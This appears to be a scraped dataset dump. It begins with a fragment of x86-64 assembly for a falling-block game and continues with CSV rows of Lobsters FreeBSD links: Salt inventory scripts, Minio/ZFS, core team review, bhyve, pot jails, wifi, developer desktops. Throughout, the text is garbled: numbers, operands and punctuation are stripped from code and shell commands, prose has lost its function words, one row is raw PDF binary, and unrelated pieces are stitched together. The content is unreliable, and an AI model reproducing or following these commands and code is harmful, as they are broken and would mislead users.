keyboardkeypressed pop rcx cmp rax jne moveoneleft mov rdi scancodecursorblockleft push rcx call keyboardkeypressed pop rcx cmp rax jne moveoneleft mov rdi scancodecursorsdown push rcx call keyboardkeypressed pop rcx cmp rax jne downkey mov rdi scancodecursorblockdown push rcx call keyboardkeypressed pop rcx cmp rax jne downkey mov rdi scancodecursorright push rcx call keyboardkeypressed pop rcx cmp rax jne moveoneright mov rdi scancodecursorblockright push rcx call keyboardkeypressed pop rcx cmp rax jne moveoneright mov rdi scancodecursorup push rcx call keyboardkeypressed pop rcx cmp rax jne rotatecounterclockwise mov rdi scancodecursorblockup push rcx call keyboardkeypressed pop rcx cmp rax jne rotatecounterclockwise mov rdi push rcx call keyboardkeypressed pop rcx cmp rax jne rotateclockwise mov rdi scancodeescape push rcx call keyboardkeypressed pop rcx cmp rax jne endofgame jmp waitforkey noinput xor rax rax ret downkey inc word score call moveonedown xor rax rax ret generatenextpiecenumber mov rax nextpieceframebeginningy nextpieceframeborderwidth nextpieceframebeginningx nextpieceframeborderwidth mov rcx nextpieceframeheight mov rbx nextpieceframewidth mov rdi boardcolor call drawrect random next piece call rand xor dx dx mov cx div cx mov byte nextpiecetype dl mov ah dl do code expects next piece type ah genfirstpiece cmp ah jne gensecondpiece mov rax nextpieceframebeginningy nextpieceframeborderwidth piecesize nextpieceframebeginningx nextpieceframeborderwidth mov rcx piecesize mov rbx piecesize mov rdi call drawrect ret gensecondpiece j cmp ah jne genthirdpiece mov rax nextpieceframebeginningy nextpieceframeborderwidth piecesize nextpieceframebeginningx nextpieceframeborderwidth piecesize mov rcx piecesize mov rbx piecesize mov rdi call drawrect mov rax nextpieceframebeginningy nextpieceframeborderwidth piecesize nextpieceframebeginningx nextpieceframeborderwidth piecesize mov rcx piecesize mov rbx piecesize mov rdi call drawrect ret genthirdpiece l cmp ah jne genforthpiece mov rax nextpieceframebeginningy nextpieceframeborderwidth piecesize nextpieceframebeginningx nextpieceframeborderwidth piecesize mov rcx piecesize mov rbx piecesize mov rdi call drawrect mov rax nextpieceframebeginningy nextpieceframeborderwidth piecesize nextpieceframebeginningx nextpieceframeborderwidth piecesize mov rcx piecesize mov rbx piecesize mov rdi call drawrect ret genforthpiece cmp ah jne genfifthpiece mov rax nextpieceframebeginningy nextpieceframeborderwidth piecesize nextpieceframebeginningx nextpieceframeborderwidth piecesize mov rcx piecesize mov rbx piecesize mov rdi call drawrect ret genfifthpiece cmp ah jne gensixthpiece mov rax nextpieceframebeginningy nextpieceframeborderwidth piecesize nextpieceframebeginningx nextpieceframeborderwidth piecesize mov rcx piecesize mov rbx piecesize mov rdi call drawrect mov rax nextpieceframebeginningy nextpieceframeborderwidth piecesize nextpieceframebeginningx nextpieceframeborderwidth piecesize mov rcx piecesize mov rbx piecesize mov rdi call drawrect ret gensixthpiece cmp ah jne genseventhpiece mov rax nextpieceframebeginningy nextpieceframeborderwidth piecesize nextpieceframebeginningx nextpieceframeborderwidth piecesize mov rcx piecesize mov rbx piecesize mov rdi call drawrect mov rax nextpieceframebeginningy nextpieceframeborderwidth piecesize nextpieceframebeginningx nextpieceframeborderwidth piecesize mov rcx piecesize mov rbx piecesize mov rdi call drawrect ret genseventhpiece z mov rax nextpieceframebeginningy nextpieceframeborderwidth piecesize nextpieceframebeginningx nextpieceframeborderwidth piecesize mov rcx piecesize mov rbx piecesize mov rdi call drawrect mov rax nextpieceframebeginningy nextpieceframeborderwidth piecesize nextpieceframebeginningx nextpieceframeborderwidth piecesize mov rcx piecesize mov rbx piecesize mov rdi call drawrect ret generatenextpiece mov ah byte nextpiecetype mov byte piecetype ah mov byte piecepivotpos firstpiece cmp ah jne secondpiece mov byte piecepos mov byte piecepos mov byte piecepos mov byte piecepos mov byte piececol ret secondpiece j cmp ah jne thirdpiece mov byte piecepos mov byte piecepos mov byte piecepos mov byte piecepos mov byte piececol ret thirdpiece l cmp ah jne forthpiece mov byte piecepos mov byte piecepos mov byte piecepos mov byte piecepos mov byte piececol ret forthpiece cmp ah jne fifthpiece mov byte piecepos mov byte piecepos mov byte piecepos mov byte piecepos mov byte piececol ret fifthpiece cmp ah jne sixthpiece mov byte piecepos mov byte piecepos mov byte piecepos mov byte piecepos mov byte piececol ret sixthpiece cmp ah jne seventhpiece mov byte piecepos mov byte piecepos mov byte piecepos mov byte piecepos mov byte piececol ret seventhpiece z mov byte piecepos mov byte piecepos mov byte piecepos mov byte piecepos mov byte piececol ret solidifypiece movzx rbx byte piecepos mov al byte piececol mov byte boardstate rbx al movzx rbx byte piecepos mov byte boardstate rbx al movzx rbx byte piecepos mov byte boardstate rbx al movzx rbx byte piecepos mov byte boardstate rbx al ret updateboard mov dl updateboardloop dec dl call clearonerow cmp dl jne updateboardloop ret clearonerow dl row clear mov bl mov al dl mul bl xor rbx rbx mov bx ax mov cx cmp byte boardstate rbx boardcolor je notclearonerow inc bx loop add word score cmp dl je notclearonerow push rdx dec dl call moverowdown cmp dl jne pop rdx jmp clearonerow notclearonerow ret moverowdown dl beginrow mov bl mov al dl mul bl xor rbx rbx mov bx ax mov cx moverowdownloop mov al byte boardstate rbx mov byte boardstate rbx al mov byte boardstate rbx boardcolor inc bx loop moverowdownloop ret moveonedown xor rax rax mov rbx xor dl dl check frame collision cmp byte piecepos jae cantmoveonedown cmp byte piecepos jae cantmoveonedown cmp byte piecepos jae cantmoveonedown cmp byte piecepos jae cantmoveonedown check space collsion xor rbx rbx mov bl byte piecepos add bl cmp byte boardstate rbx boardcolor jne cantmoveonedown mov bl byte piecepos add bl cmp byte boardstate rbx boardcolor jne cantmoveonedown mov bl byte piecepos add bl cmp byte boardstate rbx boardcolor jne cantmoveonedown mov bl byte piecepos add bl cmp byte boardstate rbx boardcolor jne cantmoveonedown add byte piecepos add byte piecepos add byte piecepos add byte piecepos add byte piecepivotpos xor rax rax ret cantmoveonedown call solidifypiece mov rax ret moveoneleft mov bl check frame collision xor ax ax mov al byte piecepos div bl cmp ah je cantmoveoneleft xor ax ax mov al byte piecepos div bl cmp ah je cantmoveoneleft xor ax ax mov al byte piecepos div bl cmp ah je cantmoveoneleft xor ax ax mov al byte piecepos div bl cmp ah je cantmoveoneleft check space collsion xor rbx rbx mov bl byte piecepos dec bl cmp byte boardstate rbx boardcolor jne cantmoveoneleft mov bl byte piecepos dec bl cmp byte boardstate rbx boardcolor jne cantmoveoneleft mov bl byte piecepos dec bl cmp byte boardstate rbx boardcolor jne cantmoveoneleft mov bl byte piecepos dec bl cmp byte boardstate rbx boardcolor jne cantmoveoneleft dec byte piecepos dec byte piecepos dec byte piecepos dec byte piecepos dec byte piecepivotpos cantmoveoneleft xor ax ax ret moveoneright mov bl check frame collision xor ax ax mov al byte piecepos div bl cmp ah je cantmoveoneright xor ax ax mov al byte piecepos div bl cmp ah je cantmoveoneright xor ax ax mov al byte piecepos div bl cmp ah je cantmoveoneright xor ax ax mov al byte piecepos div bl cmp ah je cantmoveoneright check space collsion xor rbx rbx mov bl byte piecepos inc bl cmp byte boardstate rbx boardcolor jne cantmoveoneright mov bl byte piecepos inc bl cmp byte boardstate rbx boardcolor jne cantmoveoneright mov bl byte piecepos inc bl cmp byte boardstate rbx boardcolor jne cantmoveoneright mov bl byte piecepos inc bl cmp byte boardstate rbx boardcolor jne cantmoveoneright inc byte piecepos inc byte piecepos inc byte piecepos inc byte piecepos inc byte piecepivotpos cantmoveoneright ret rotateclockwise checkboard mov rbx dec bx push rbx xor ax ax mov bl mov al byte piecepivotpos div bl pop rbx cmp ah jb cantrotateclockwise cmp ah ja cantrotateclockwise cmp al ja cantrotateclockwise mov cx ax xor ax ax mov al byte piecepos rbx push rbx mov bl sub al byte piecepivotpos div bl mov dx ax ah x al mov ah dl cmp byte piecetype je rotateclockwisespc mov al rotateclockwisespcback sub al dh mov dx ax mov al dl mov bl mul bl add al dh pop rbx add al byte piecepivotpos mov byte temporarypiecepos rbx al cmp bx jne xor rbx rbx mov bl byte temporarypiecepos cmp byte boardstate rbx boardcolor jne cantrotateclockwise mov bl byte temporarypiecepos cmp byte boardstate rbx boardcolor jne cantrotateclockwise mov bl byte temporarypiecepos cmp byte boardstate rbx boardcolor jne cantrotateclockwise mov bl byte temporarypiecepos cmp byte boardstate rbx boardcolor jne cantrotateclockwise mov al byte temporarypiecepos mov byte piecepos al mov al byte temporarypiecepos mov byte piecepos al mov al byte temporarypiecepos mov byte piecepos al mov al byte temporarypiecepos mov byte piecepos al cantrotateclockwise xor ax ax ret rotateclockwisespc mov al jmp rotateclockwisespcback rotatecounterclockwise checkboard mov rbx dec bx push rbx xor ax ax mov bl mov al byte piecepivotpos div bl pop rbx cmp ah jb cantrotatecounterclockwise cmp ah ja cantrotatecounterclockwise cmp al ja cantrotatecounterclockwise mov cx ax xor ax ax mov al byte piecepos rbx push rbx mov bl sub al byte piecepivotpos div bl mov dx ax ah x al mov al dh cmp byte piecetype je rotatecounterclockwisespc mov ah rotatecounterclockwisespcback sub ah dl mov dx ax mov al dl mov bl mul bl add al dh pop rbx add al byte piecepivotpos mov byte temporarypiecepos rbx al cmp bx jne xor bx bx movzx byte temporarypiecepos cmp byte boardstate boardcolor jne cantrotatecounterclockwise movzx byte temporarypiecepos cmp byte boardstate boardcolor jne cantrotatecounterclockwise movzx byte temporarypiecepos cmp byte boardstate boardcolor jne cantrotatecounterclockwise movzx byte temporarypiecepos cmp byte boardstate boardcolor jne cantrotatecounterclockwise mov al byte temporarypiecepos mov byte piecepos al mov al byte temporarypiecepos mov byte piecepos al mov al byte temporarypiecepos mov byte piecepos al mov al byte temporarypiecepos mov byte piecepos al cantrotatecounterclockwise xor ax ax ret rotatecounterclockwisespc mov ah jmp rotatecounterclockwisespcback delay second loop input time delayforwhile mov rdi usleepms call usleep ret delayforlongwhile mov rdi call usleep ret setnewdelay cmp byte waittime jb nosetnewdelat mov ax word score xor dx dx mov bx div bx mov dx ax mov ax cmp ax dx jl sub ax dx mov byte waittime al nosetnewdelat ret mov byte waittime ret scoretostring xor dx dx mov ax word score mov bx div bx add ax mov byte scoreasstring al mov ax dx xor dx dx mov bx div bx add ax mov byte scoreasstring al mov ax dx xor dx dx mov bx div bx add ax mov byte scoreasstring al mov ax dx xor dx dx mov bx div bx add ax mov byte scoreasstring al add dx mov byte scoreasstring dl mov byte scoreasstring c string end mov bx mov dl mov rdi scoreposx mov rsi mov rdx scorestring call glwrite mov rdi scoreposx x position mov rsi scoreposy position mov rdx scoreasstring position string character call glwrite ret writescore mov rdi scoreposx mov rsi mov rdx scorestring call glwrite mov rdi scoreposx x position mov rsi scoreposy position mov rdx scoreasstring position string character call glwrite ret displaygameover xor rax rax mov rcx mov rbx mov rdi boardcolor call drawrect mov rdi gameoverposx x position mov rsi gameoverposy position mov rdx gameover position string character call glwrite ret
13,Lobsters,freebsd,FreeBSD,Software Inventory with Salt on FreeBSD,https://blog.socruel.nu/freebsd/software-inventory-with-salt-on-freebsd.html,software inventory salt freebsd,software inventory salt freebsd introduction ci control ci control freebsd saltstack saltstack pkg module freebsd software package salt minion saltstack freebsd saltstack freebsd series basic explained saltstack freebsd freebsd freebsd package salt pkg module package salt master salt salt minion salt json json json jq freebsd port jq freebsd salt minion inventory script bash bash freebsd port query host package package bash bash query package installed somewhere freshports bash bash wrap salt pkg module saltstack saltstack operating system freebsd openbsd linux ocs inventory freebsd freebsd port resource,software inventory salt freebsd introduction software inventory one ci control ci control provide prioritized cybersecurity best practice recommended set action cyber defense provide specific actionable way stop today pervasive dangerous attack recently software inventory control socruelnu platform platform almost completely based freebsd host physical virtual laptop managed saltstack would nice used purpose saltstack pkg module manage control freebsd software package running salt minion post requires setup saltstack freebsd information see saltstack freebsd series post basic explained saltstack pkg module freebsd documented please aware old documentation freebsd use pkg instead pkgng calling module inventory software running freebsd system list package installed system using salt pkg module calling listpkgs option list package system called minionintradomaintld run command salt master sudo salt minionintradomaintld pkglistpkgs salt also possible call multiple system salt minion sudo salt domaintld pkglistpkgs output command really structured wait salt support json format output utilize use option sudo salt intradomaintld pkglistpkgs outjson json output queried lighweight flexible commandline json processor jq available freebsd port install jq use command sudo pkg install jq needed ingredient able software inventory freebsd based salt minion inventory script code chapter written bash bash also available freebsd port installed easily sudo pkg install bash query host package first requirement able query host host see package installed particular host host format output nice way done based basic described bash code call script sish need host queried input like ie sudo sish sudo sish intranetdomaintld first state use bash declare program variable tool need usrbinenv bash command varsalt usrlocalbinsalt varsed usrbinsed varcat bincat vartee usrbintee vartouch usrbintouch vargrep usrbingrep varwc usrbinwc varchmod binchmod varrm binrm rf varjq usrlocalbinjq next declare exit state exit state write main part script varhostsoutfile tmphostsout varrm varhostsoutfile devnull vartouch varhostsoutfile varchmod varhostsoutfile varhosts z input echo function requires hostame input ie tst intranetdomaintld exit varstatewarning else echo package installed varhosts vartee varhostsoutfile echo vartee varhostsoutfile varsalt varhosts pkglistpkgs outjson static varsed varsed varsed varsed g varsed varsed retcoded vartee varhostsoutfile fi line code first line create output file tmphostsout line declares variable varhosts taken input parameter line define else fi statement line check input parameter exists line state happens input parameter exist line state happens input parameter exist happens line echo text standard output output file tmphostsout line echo blank line standard output output file tmphostsout make output nicer line salt command query varhosts package output made nicer couple sed command copied standard output output file tmphostsout output look like sudo sish testintranetdomaintld package installed testintranetdomaintld testintranetdomaintld carootnss curl entr expat fping gdbm gettextruntime gmp gnuls indexinfo libev libffi libiconv libinotify libmaxminddb lowdown minio minioclient nagioscheckports nagiosplugins netsnmp nginx norm openpgm openssl pcre pkg portmaster readline rsync sudo query package installed somewhere often find eg freshports certain package vulnerability nice know quickly host package running second requirement basic discussed bash code call script sish need host want query well package name queried input like ie sudo sish testintranetdomaintld sudo sish domaintld vimconsole first state use bash declare program variable tool need usrbinenv bash command varsalt usrlocalbinsalt varsed usrbinsed varcat bincat vartee usrbintee vartouch usrbintouch vargrep usrbingrep varwc usrbinwc varchmod binchmod varrm binrm rf varjq usrlocalbinjq next declare exit state exit state write main part script varpackageoutfile tmppackageout varrm varpackageoutfile devnull vartouch varpackageoutfile varchmod varpackageoutfile varliveserversoutfile tmpliveserversout varrm varliveserversoutfile devnull vartouch varliveserversoutfile varchmod varliveserversoutfile varhosts varpackage z echo option requires hostname argument ie testintranetdomaintld domaintld exit varstatewarning else z echo option requires package name argument ie exit varstatewarning else varsalt varhosts testping outjson grep true varsed strue g varsed g varsed g varsed g varsed varliveserversoutfile echo package varpackage installed vartee varpackageoutfile echo vartee varpackageoutfile varcat varliveserversoutfile read varservername varpackageversion varsalt varservername pkglistpkgs outjson static varjq varjq arg k varpackage k varpackageversion null echo varservername vartee varpackageoutfile fi done fi fi varrm varliveserversoutfile check host actually live moment issue script line varsalt varhosts testping outjson grep true varsed strue g varsed g varsed g varsed g varsed varliveserversoutfile host live put file varliveserversoutfile file read line line done loop line host checked given package installed varpackageversion varsalt varservername pkglistpkgs outjson static varjq varjq arg k varpackage k varpackageversion null echo varservername vartee varpackageoutfile fi example output script action query package vmbhyve look like sudo sish intranetdomaintld vmbhyve package vmbhyve installed wrap done example salt pkg module option capability one shown module eg also audit option query installed package known vulnerability left reader fill one much like query actual situation host script explained provides situation find powerfull script documented however provide historical information andor nice web interface could export saltstack query text file even database saltstack pkg module operating system independent mixed environment freebsd openbsd even linux based distibutions would al work nicely bare basic solution fit need need comprehensive software inventory solution including web interface application please take look ocs inventory fully supported freebsd available freebsd port might implement one day resource resource subject updated july
14,Lobsters,freebsd,FreeBSD,ZFS High Availability Filesystem with Minio on FreeBSD,https://honeyguide.eu/posts/minio-fuse/,zfs high availability filesystem minio freebsd,introduction minio separate post already value previous post explaining set minio fusefs credential preparation mount bucket filesystem bucket raw device zfs,introduction minio wellknown compatible object storage platform support high availability scalability feature easy configure separate post already describing set minio freebsd post explains use minio storage platform provide ha filesystems freebsd describe two way mount bucket file system freebsd pkg install pkg install filesystem like zfs ffs top provides direct access bucket content relatively slow mounted many node time though bucket block device use file system like zfs top appropriately configured caching fast since transaction asynchronous since zpool file system mounted one host time suitable eg ha storage container jail run different host parallel eg failover scenario filesystem bucket unmounted remounted another host via network quickly course network drive also mounted eg via nfs minio storage layer provides scale high availability feature easily replicated nfs file server na system following step use value previous post explaining set minio fusefs credential preparation ensure fusefsbased filesystems run freebsd need add fuse bootloaderconf echo fuseload yes bootloaderconf either reboot load module first time hand kldload fuse also need access key create file containing login credential minio setup echo myaccesskey mysecretkey mount bucket filesystem install file system driver pkg install create mount point eg bucket want mount case testbucket simply via minio web interface mount bucket already testbucket urlhttps usepathrequeststyle enablenoobjcache nocheckcertificate usexattr complementstat get detailed description option via man want mount bucket automatically boot add following line etcfstab testbucket fuse rw netdev allowother late urlhttps usepathrequeststyle enablenoobjcache nocheckcertificate usexattr complementstat bucket raw device zfs create filesystem like zfs inside bucket install pkg install use empty bucket called testbucket mount command line first assuming unmounted first listblocks testbucket baseurlhttps insecure command creates raw device also set cache size block let u create zpool zpool create atimeoff note file appended path used mounting bucket created imported simply running eg zpool import also mount block device via etcfstab fuse rw allowother late listblocks baseurlhttps insecure mounting block device etcfstab want mount zpool
15,Lobsters,freebsd,FreeBSD,FreeBSD Core Team 10 in Review,https://freebsdfoundation.org/blog/freebsd-core-team-10-in-review/,freebsd core team review,celebrating year democratic management freebsd preparing next working group structure email protected email protected email protected email protected email protected regular core report public quarterly report previous next,celebrating year democratic management freebsd preparing next core team ready take management freebsd project interviewed member core team observation productive two year democracy slow process stumbling right decision instead going straight forward wrong one anonymous year freebsd project elected group project committers serve twoyear term core team ct short active developer project eligible vote selfnominated candidate project website describes role core team follows freebsd core team constitutes project board director responsible deciding project overall goal direction well managing specific area freebsd project landscape concluded july made several process decision tackle perceived heavy workload decided burn retire old potentially unaddressable issue could focus current problem kicking old issue one core team next helping community one member put itthey established working group structure deputize people tackle big project notably first set motion imminent adoption git initiated annual community survey support datadriven decision makingthey increased cadence meeting adopted new ct communication collaboration mode notably ct switched using slack irc bridge google doc collaborating messaging following people served number represents time served core bold indicating represents consecutive term allan jude reuschling davis sato roberson john baldwin moore sean chittenden losh composition reflects balance new idea institutional knowledge contribute project steady innovation warner losh served first core team total six put way important mix people new idea asking people involved longer reflect thing done way balance protects allowing way thing done getting way improvement freebsd foundation interviewed several member understand made tick strategy team pursued successfully tackle challenging topic like migrating git updating coc emerges team focus collaboration transparency essential achieving much multiple member interviewed including served core observed team decision focus small number big initiative key representing opposite end new longserving spectrum jeff roberson john baldwin offered strikinglysimilar take importance prioritization figure early small set thing going drive completion said jeff john add stuff agenda instead pick one three big thing per term otherwise easy get spread thin make progress course focusing smaller set big project requires consensus onwhich thing pursue brings u one big initiative annual community survey echoing comment several member allan jude note annual user survey second round useful discover people using freebsd instance help u answer longdebated question like people actually want frequent release secretary joseph mingrone add community developer survey big step towards becoming datadriven transparent purpose focusing small number bigger project undertake jeff roberson found survey revealed nearly universal common theme lot common ground case member felt election provided mandate observing uncommon experience core john baldwin remarked rarely core come term mandate time coc clear mandate let unpack move git coc update understand operated forthcoming report git working group provide definitive rationale move general consensus interview conference talk lack git impediment attracting new developer project svn also make code collaboration difficult many member shared allan jude assessment latter dominant motivator git seen better collaboration tool need git add extra remote anywhere internet collaborate anyone even freebsd account make much easier collaborate svnbased system today git also allows create series commits move around unit rebase svn monolithic git also advantage ci take patch context formalized working group structure charter people undertake significant project fit neatly existing team notable instance wgs action git warner perspective git working group ed maste leading charge really work core provided oversight asking lot question turned good model git hard part figuring transition phase big leap sideways allows u continue innovate git add capability feature go community decision art politics art possible asked answered possible version revealing advantage engaged community mature use case brook davis shared cheri project work served excellent challenging use case smoke svn git migration issue kris moore also shared ixsystems changed truenas product subversion git community engagement code submission user increased freebsd pragmatic community perfect enemy good committing transition plan svn git agreed upon next logical step initial migration git core team expects future working group spring enhance developer community contribution experience significant portion community dissatisfied existing code conduct several interviewee observed one ct member put freebsd strives inclusive fair community coc sits heart goal way establish community norm interaction easy understand follow enforce others observed interpersonal issue tend dominate work core seemed particularly although kind work draining fact ct nine member ensures enough bench alleviate burn ct undertook thorough process researching project arrived current coc soliciting feedback community discussing desired end state agreeing project would best served tailoring existing fieldproven coc another project one member coc work felt like democracy action ct came community mandate address issue committed pursued transparent inclusive process followed time writing community process voting preferred coc among two option put forward ct working group structure said strategy much delegating work good process around accountability followthrough essential successful term ct formalized working group structure put action git wg allan jude offer take core tried improve process someone propose bigger idea get momentum similar python pip earlier effort around freebsd community proposal catch think put much burden person requesting change core adopted working group person group proposes wg person group creates charter operating plan core reviewsapproves proposal giving group implicit blessing pursue potentially disruptive change improve community seems right model benefit wg structure noted member interviewed move project away socalled culture hero wgs might eliminate need occasional act heroism community depends entirely hero big change leaf unnecessarily exposed risk burnout well tyranny minority recognizing amount work ahead early term behest secretary joseph mingrone ct decided double meeting frequency twice month time size ct backlog high team met weekly admitting significant investment brook davis note higher meeting frequency helped u make lot progress efficiency also helped team bond certainly always agree team collegial could disagree without disagreeable ct working thing like coc collegiality important set tone project encapsulating importance collaboration collegiality warner offer management observation big reason core effective understood needed work together even though held different perspective different priority term working team project mean dealing politics different group goal prevent politics impossible rather goal prevent toxic politics despite tackling highlycharged topic like coc succeeded group able facilitate constructive engagement one another across project management role like freebsd core working volunteer something learn quickly giving ultimatum work instead using power persuasion help shape direction bsdcan status presentation sean chittendon highlighted following example strong collaboration pretty aggressive using google doc content reviewnearly every announcement sent email protected email protected behalf core drafted google doc shared approved core teamslack realtime communication mobile notification coherent history important jumping new community incidentaligned vision among core teamsequencing issue tackling abc month quarter moving xyz aligning meeting w email protected email protected get enough credit role helping email protected regular core report result informed community addition meeting frequently also published detailed frequent note task fall secretary addition secretary play vital role project manager help core stay organized efficient exception secretary joseph mingrone sent detailed report freebsd committers also provided public quarterly report joseph freebsd user since port committer year felt frequent detailed report important remove perception secrecy might diminish trust ct project ct member spoke unanimously hailed effort joseph essential team success counseled future core team recruit secretary joseph commitment member spoke expressed interest exploring way make work ct working group even transparent one option offered potentially open core meeting least part broader audience noted model place similar project like openzfs much meeting possible open portion dealing matter privacy needed closed may worthwhile exploreother member suggested opening working group greater participation among contributor user could beneficial reaching twenty year technology organization remarkable feat especially one considers average lifespan business year enduring technology company whether apple ibm even microsoft radically reinvented many case multiple time stay relevant world around u change researching article emerges clear feeling among freebsd project community stand precipice similar reinvention one look embrace git important example tenacity strong democratic community determined remain relevant year come previousnext
16,Lobsters,freebsd,FreeBSD,Installing Debian Under FreeBSD Bhyve,https://blahg.josefsipek.net/?p=595,installing debian freebsd bhyve,vmbhyve fails boot xfs root file system crc support debian try make multibooting possible,weekend tried move work dev vm slightly beefier vm host meant moving vm kvm omnios bhyve freebsd moving disk image tried configure vmbhyve use asis unfortunately fails boot xfs root file system crc support good way convert disk image get boot via uefi instead avoid completely decided simply reinstall theory difficult since foresight home separate virtual disk practice spent several hour reinstalling debian buster trying figure install reboot fine subsequent boot make past efi firmware turn debian try make multibooting possible put efi binary nonstandard location combined bhyve persisting efi variable shutdown result boot first poweroff even trying look debianspecific path debian bug rather bhyve efi support incomplete easiest way around copy debian binary standard location immediately installation word cd bootefiefi mkdir boot cp needed downside copy get automatically upgraded grub get update completeness relevant bit vm config loader uefi graphic yes cpu memory virtionet public zfszvolopts sparsezvol virtioblk sparsezvol virtioblk
17,Lobsters,freebsd,FreeBSD,Refactoring the FreeBSD Kernel with Checked C,https://cs.rochester.edu/u/jzhou41/papers/freebsd_checkedc.pdf,refactoring freebsd kernel checked c,,obj length filter flatedecode stream xڵ p u e f p 院 c g bⱦ lnmэ c h ѱ endstream endobj obj type objstm n first length filter flatedecode stream e ri r j e j g rkw fm ލ e pq endstream endobj obj length filter flatedecode stream q ͻo hz b l e
18,Lobsters,freebsd,FreeBSD,"Throw-Away Browser on FreeBSD With ""pot"" Within 5 Minutes",https://honeyguide.eu/posts/pot-throwaway-firefox/,throwaway browser freebsd pot within minute,overview orchestrating jail nomad pot setting potpizzamigdev creating jail flavour template creating onetime jail running browser clean use snapshot,overview pot great relatively new jail management tool offer devops style provisioning even used provide dockerlike scalable cloud service together nomad consul orchestrating jail nomad pot using freebsd desktop also use simply easily create throw away browser jail way browser environment reliably completely erased reset time recreate one single simple command please note pot command run root setting pot installing setting potis described detail potpizzamigdev quite straightforward stick sensible default pkg install pot pot init v creating jail flavour template create pot flavour contains detail browser jail usrlocaletcpotflavours flavour contains two simple file directory usrlocaletcpotflavoursbrowser setattribute norcscript v yes setattribute persistent v usrlocaletcpotflavoursbrowsersh binsh w etcpkgfreebsdconf sed squarterlylatest etcpkgfreebsdconf assumealwaysyesyes pkg bootstrap touch etcrcconf sysrc sendmailenable none sysrc sshdenable yes echo myjailpassword pw add user ffoxuser h mkdir homeffoxuser chown ffoxuser homeffoxuser pkg install xauth firefox pkg clean make shell script executable otherwise ignored pot chmod ugox browsersh course could instead firefox also install chromium browser application creating onetime jail running browser simply create jail sudo pot create p onetimebrowser b n publicbridge single f browser watch output creating new pot pot name onetimebrowser type single base potbase level networktype publicbridge ip bridge dns inherit flavour browser fetching freebsd note pot assigns private ip address jail case start browser jail pot start onetimebrowser start firefox jail ssh x ffoxuser firefox necessary replace ip address ip address output copied configuration password asked myjailpassword clean soon done browsing closed browser session stop jail pot stop onetimebrowser delete jail pot destroy p onetimebrowser data associated browsing session completely removed use snapshot lot efficient recreating jail scratch time would taking snapshot immediately creating jail pot snapshot p onetimebrowser instead deleting jail simply roll back finished browsing pot revert p onetimebrowser
19,Lobsters,freebsd,FreeBSD,FreeBSD Journal FAQs – 2020/05-06 – Network Performance,https://www.freebsdfoundation.org/past-issues/network-performance/,freebsd journal faq network performance,table content click start reading,table content click start reading
20,Lobsters,freebsd,FreeBSD,Chai-Fi Makes Adding Public WiFi Networks to wpa_supplicant.conf Easier,https://github.com/gonzoua/chaifi,chaifi make adding public wifi network wpasupplicantconf easier,chaifi description quick start build usage screenshot,chaifi description tool make adding public wifi network wpasupplicantconf easier quick start sudo pkg install go go get githubcomgonzouachaifi sudo gobinchaifi add homegobin path note currently work without sudo make etcwpasupplicantconf editable user build go get go build usage usage chaifi f string path wpasupplicantconf default etcwpasupplicantconf string wireless interface default r restart netif service config changed screenshot
21,Lobsters,freebsd,FreeBSD,FreeBSD Back to Seeing Progress on 802.11ac WiFi Support,https://www.phoronix.com/scan.php?page=news_item&px=FreeBSD-802.11ac-Ath10k-Pro,freebsd back seeing progress wifi support,adrian blog nice accomplishment,longtime freebsdlinux network stack developer former qualcomm atheros engineer adrian chadd back working freebsd wireless networking improvement adrian chadd announced return working freebsd wireless networking stack particular focus support largely lack moment porting driver linux freebsd five year since chadd began driver port freebsd found renewed energy work task freebsd process porting also meant improving freebsd kernel code due largely lacking support moving along well spelled many detail adrian blog interested freebsd wireless networking good news opensource bsd operating system project top nice accomplishment
22,Lobsters,freebsd,FreeBSD,Can You Use FreeBSD for Developer Machine in 2020?,https://www.jeremymorgan.com/blog/freebsd/freebsd-developer-2020/,use freebsd developer machine,freebsd amazing operating system history freebsd giant manual jumping back reading freebsd like developing freebsd setup script gist use freebsd development machine c c python best possible choice frontend web developer overall backend web developer would developer want use freebsd osx linux linux kernel repos freebsd system carefully crafted ecosystem generally freebsd performs better linux many test shown documentation incredible freebsd often one way something port system awesome would use freebsd package available need dockerkubernetes according documentation challenging set get started freebsd virtualbox download freebsd read documentation installing freebsd desktop environment freebsd forum current v release freebsd foundation use freebsd developer machine yes let know,freebsd solid choice server ubiquitous infrastructure world hold desktop machine developer workstation found outi considering moving blog back freebsd web server hosted way year recently switched linux machine could make octopress work properly us old outdated ruby gem seemed easierbut new redesign coming new hugo backend bringing hosting machine back freebsdi recently read freebsd amazing operating system got thinking freebsd viable desktop operating system developer article talk led freebsdhow setting kind developer benefit freebsdwhat get startedlet dig inmy history freebsdi first tried freebsd frustrated linux intrigued using couple year friend suggested freebsd ran portland egghead software bought copyi found pretty frustrating first giant manual reference much google dug one thing noticed right away documentation seemed clear accurate told something followed got expected result hookedi first hosted jeremymorgancom old pentium machine running freebsd sitting garage first real tech job working freebsd dove headfirst learning using daily driver year ran web hosting service freebsd catastrophic failure try let bias review hereeventually started working developer using linux every day match environment home work started drifting away freebsd soon enough using except hosting websitejumping back inso recently reading freebsd researching online installed fired virtual machine quirky error thing changed little year since used desktopi quickly put real hardware machine use running virtual server old ssd lying around threw freebsd stable minimal tinkering involved running might expect older hardware easier set bsd onafter experimenting put brand new laptop hardware work specifically wireless network card ended putting freebsd current iti installed freebsd stable lab machine main work machine used lxde desktop environment old school like itwhat like developing freebsd nowi surprised many thing worked well freebsd set development machine match arch linux machine much possible machine browsingemailnewsweb development frontend backend golang developmentpython developmentcontainers virtualizationwriting article like set freebsd machine thing mostly could away freebsd surprised much stuff available could install single line like example thing installed shared setup script gisthere worked exactly expected v code thankfully nodegorustdockervirtualboxvarious package built sourcehere work available react clisublime text vmware workstationvagrantso able make mirror arch linux environment successful quite bit using two week determined developer use freebsd desktop explain would want towho use freebsd development machine freebsd server world enormous community anyone development maintenance freebsd package use freebsd workstation go without sayingalso c c python developer freebsd probably best possible choice number tool package available true long timebut address audience reader blog need frontend web developersnode seems work well could spin react app modification get react cli work mostly nodegit seems achilles heel installing react cli anything mainstream platformsoperating systemsangular work great playing around sas dependency ran flawlesslyvue cli run great though much push itoverall run significant snag front end thing believe front end developer could use freebsd development machine would similar using linuxbackend web developersthis one tricky since many option choose could get lot thing working well know others used backend without problem freebsd includes golangpythonnodejavasqlitepostgresqlmysqlif work technology right home functional freebsd workstationif net core developer freebsd might way install seems like run linux compatibility ancient version think freebsd diehard excited working microsoft product platform enough work sure possibleso system developer front end backend developer could use freebsd development workstation would want read onwhy would developer want use freebsd reading far likely either using window mac linux development might think change point try let personal bias enter article reason love osx linux could reason love freebsd even explainfreebsd close osx linux stand reason osx 